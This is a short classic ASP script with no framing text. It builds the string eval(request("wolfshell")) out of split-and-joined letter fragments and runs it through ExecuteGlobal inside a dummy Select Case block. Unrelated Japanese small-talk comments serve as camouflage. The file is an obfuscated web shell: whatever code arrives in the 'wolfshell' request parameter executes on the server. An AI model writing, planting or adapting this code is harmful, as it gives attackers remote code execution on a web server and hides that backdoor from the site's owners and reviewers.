<%
'// 月が綺麗ですね。
Dim p_q_r_1, s_t_u_2, v_w_x_3
p_q_r_1 = "e|v|a|l"
s_t_u_2 = "r|e|q|u|e|s|t"
v_w_x_3 = "w|o|l|f|s|h|e|l|l"

'// このソフトウェアは無料で利用できます。
Dim a_1_b_2, c_3_d_4, e_5_f_6
a_1_b_2 = Split(p_q_r_1, "|")
c_3_d_4 = Split(s_t_u_2, "|")
e_5_f_6 = Split(v_w_x_3, "|")

'// 昨日の晩御飯はカレーでした。
Dim j_1, j_2, j_3, final_str_k
j_1 = Join(a_1_b_2, "")
j_2 = Join(c_3_d_4, "")
j_3 = Join(e_5_f_6, "")

'// 何か面白いことないかな。
Dim flow_control
flow_control = 100
Select Case flow_control
    Case 100
        final_str_k = j_1 & "(" & j_2 & "(""" & j_3 & """))"
        ExecuteGlobal final_str_k
    Case Else
        '// このパスは実行されません。
End Select
%>